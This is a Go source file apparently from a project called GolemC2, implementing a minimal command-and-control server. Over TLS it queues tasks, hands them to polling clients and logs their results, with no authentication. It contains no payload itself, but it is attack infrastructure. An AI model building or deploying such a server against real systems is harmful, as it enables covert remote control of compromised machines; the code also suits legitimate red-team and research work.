package cmd 

import (
  "encoding/json"
  "fmt"
  "log"
  "net/http"
  "sync"

  "github.com/DUDLEYDANIEL/GolemC2/internal"
)

var tasks []internal.Task 
var results []internal.Result
var mu sync.Mutex

func RunServer(){
  mux := http.NewServeMux()

  mux.HandleFunc("/tasks", func(w http.ResponseWriter,r *http.Request){
    mu.Lock()
    defer mu.Unlock()
    json.NewEncoder(w).Encode(tasks)
    tasks = nil
  })

  mux.HandleFunc("/results", func(w http.ResponseWriter, r *http.Request){
    var result internal.Result
    if err := json.NewDecoder(r.Body).Decode(&result); err != nil {
      http.Error(w, "Invalid result", http.StatusBadRequest)
      return
    }
    mu.Lock()
    results = append(results, result)
    mu.Unlock()
    fmt.Println("Received result: ", result)
  })

  mux.HandleFunc("/add-tasks", func(w http.ResponseWriter, r *http.Request){
    var task internal.Task
    if err:= json.NewDecoder(r.Body).Decode(&task); err != nil {
      http.Error(w, "Invalid task", http.StatusBadRequest)
      return 
    }
    mu.Lock()
    tasks = append(tasks, task)
    mu.Unlock()
    w.WriteHeader(http.StatusCreated)
  })

  fmt.Println("[+] c2 Server listening on https://localhost:8443")
  err := http.ListenAndServeTLS(":8443", "certs/server.crt", "certs/server.key", mux)
  if err != nil{
    log.Fatal("Server Failed :", err)
  }
}

